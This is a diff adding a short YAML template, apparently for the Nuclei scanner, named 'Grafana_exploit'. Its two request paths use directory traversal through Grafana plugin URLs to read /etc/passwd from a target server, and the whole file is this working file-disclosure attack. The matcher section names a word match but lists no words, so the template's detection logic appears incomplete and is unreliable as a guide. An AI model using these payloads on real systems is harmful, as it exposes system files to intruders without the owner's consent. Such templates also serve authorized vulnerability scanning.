@@ -1,0 +1,19 @@
+id: Grafana_exploit
+
+info: 
+  author: T4t4ru
+  severity: high
+  tags: "LFI"
+
+requests: 
+  - 
+    matchers: 
+      - 
+        part: body
+        type: word
+    max-redirects: 3
+    method: GET
+    path: 
+      - "{{BaseURL}}/public/plugins/welcome/#/../../../../../../../../../etc/passwd"
+      - "{{BaseURL}}/public/plugins/grafana-clock-panel/../../../../../../../etc/passwd"
+    redirects: true
